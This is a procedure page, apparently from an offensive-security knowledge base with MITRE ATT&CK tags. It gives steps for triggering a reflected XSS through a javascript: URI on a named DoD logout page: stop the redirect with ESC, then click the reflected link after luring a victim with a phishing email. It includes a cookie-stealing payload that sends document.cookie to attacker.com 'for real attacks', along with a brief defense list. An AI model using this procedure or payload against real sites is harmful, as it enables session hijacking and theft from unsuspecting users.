---
id: proc-trigger-xss-interaction
tags:
  - xss
  - execution
  - user-interaction
type: procedure
tools:
  - '[[tools/Browser-Unspecified]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T00:11:15.963Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Trigger-XSS-Payload-via-User-Interaction

## Summary

This procedure triggers the reflected javascript: URI payload by interrupting page behavior and simulating a victim click, resulting in arbitrary JavaScript execution for data exfiltration or phishing.

## Description

On the vulnerable DoD logout page, the injected URI in the 'home' parameter appears in a 'return to application' link. Press ESC to stop auto-redirect, then click the link to execute the JS in the browser context. This runs with the victim's session privileges, allowing cookie theft (e.g., document.cookie) or form manipulation. Prerequisites: Loaded malicious URL.

## Requirements

1. Loaded page with reflected payload
2. Browser with developer tools
3. Victim lure mechanism (e.g., phishing email with URL)

## Defense

Defensive measures and detection strategies:

- Disable or sandbox javascript: URIs in browser policies
- Implement clickjacking protection and link validation
- Detect via browser security extensions or endpoint monitoring for unexpected JS alerts

## Objectives

1. Execute injected JavaScript
2. Access victim session data
3. Demonstrate impact like cookie theft

## Instructions

### Step 1: Interrupt Redirection

**Context**: Prevent the page from auto-redirecting away from the vulnerable link.

**Instructions**: After loading the malicious URL, immediately press the ESC key in the browser.

> This halts any ongoing navigation, keeping the page with the reflected link visible.

### Step 2: Interact with Reflected Link

**Context**: Simulate victim clicking the return link to trigger execution.

**Instructions**: Locate and click the 'Click here to return to your application.' link on the page.

> The browser executes the javascript: URI, running the payload (e.g., alert('XSS Success!')). For real attacks, replace alert with exfiltration: javascript:fetch('http://attacker.com?cookie='+document.cookie)().

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Browser-Unspecified]]

## Tags

- [[xss]]
- [[Execution]]
